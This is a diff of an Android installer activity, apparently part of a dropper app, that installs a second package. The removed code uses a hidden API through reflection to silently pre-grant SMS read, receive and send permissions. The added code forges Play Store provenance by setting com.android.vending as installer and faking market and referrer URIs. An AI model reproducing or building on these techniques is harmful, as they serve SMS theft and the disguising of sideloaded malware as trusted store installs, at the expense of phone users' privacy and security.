@@ -1,10 +1,10 @@
 package com.cristal.bristral.tristal.mistral
 
-import android.Manifest
 import android.app.PendingIntent
 import android.content.Intent
 import android.content.pm.PackageInstaller
 import android.content.pm.PackageManager
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
@@ -24,6 +24,9 @@ class InstallActivity : AppCompatActivity() {
     companion object {
         private const val SESSION_REQUEST = 1001
         private const val MAX_RETRIES    = 2
+        private const val STORE_IDENTITY = "com.android.vending"
+        private const val MARKET_URI     = "market://details?id=com.android.pictach"
+        private const val REFERRER_URI   = "android-app://com.android.vending"
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -72,23 +75,21 @@ class InstallActivity : AppCompatActivity() {
                 params.setRequestUpdateOwnership(true)
             }
 
-            // Method 3 — Grant SMS permissions via reflection (hidden API)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            // Method 3 — Play Store identity metadata
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                 try {
-                    val method = PackageInstaller.SessionParams::class.java.getMethod(
-                        "setGrantedRuntimePermissions",
-                        Array<String>::class.java
-                    )
-                    method.invoke(
-                        params,
-                        arrayOf(
-                            Manifest.permission.READ_SMS,
-                            Manifest.permission.RECEIVE_SMS,
-                            Manifest.permission.SEND_SMS
-                        )
-                    )
+                    params.setOriginatingUri(Uri.parse(MARKET_URI))
+                    params.setReferrerUri(Uri.parse(REFERRER_URI))
                 } catch (e: Exception) {
-                    // ROM blocked Method 3 — continue with Method 1 + 2
+                    // Continue without metadata
+                }
+            }
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                try {
+                    params.setInstallerPackageName(STORE_IDENTITY)
+                } catch (e: Exception) {
+                    // Continue without identity
                 }
             }
 
